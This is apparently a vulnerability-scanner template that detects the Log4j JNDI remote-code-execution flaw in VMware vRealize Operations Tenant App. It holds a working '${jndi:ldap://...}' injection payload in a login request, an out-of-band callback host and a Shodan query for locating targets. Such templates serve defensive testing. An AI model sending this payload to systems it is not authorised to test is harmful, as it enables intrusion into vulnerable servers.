id: vrealize-operations-log4j-rce

info:
  name: VMware vRealize Operations Tenant App Log4j JNDI Remote Code Execution
  author: bughuntersurya
  severity: critical
  description: |
    VMware vRealize Operations is susceptible to a critical vulnerability in Apache Log4j which may allow remote code execution in an impacted vRealize Operations Tenant application.
    shodan-query: http.title:"vRealize Operations Tenant App"
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
    - https://core.vmware.com/vmsa-2021-0028-questions-answers-faq
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://nvd.nist.gov/vuln/detail/CVE-2021-45046

set:
  rooturl: request.url
  hostname: request.url.host
  reverse: newReverse()
  reverseURL: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /suite-api/api/auth/token/acquire
      headers:
        Content-Type: application/json
        Origin: "{{rooturl}}"
        Referer: "{{rooturl}}/ui/"
      body: |
        {"username":"${jndi:ldap://{{hostname}}.{{reverseURL}}}","password":"admin"}
    expression: reverse.wait(5)
expression: r0()